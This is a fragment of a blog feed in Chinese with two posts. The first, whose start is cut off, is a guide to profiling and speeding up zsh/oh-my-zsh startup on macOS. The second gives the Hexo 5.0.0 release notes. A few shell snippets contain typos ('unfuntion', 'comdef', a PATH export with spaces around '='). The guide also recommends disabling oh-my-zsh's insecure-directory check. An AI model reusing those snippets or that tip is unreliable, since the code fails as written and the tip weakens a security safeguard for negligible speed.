class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div 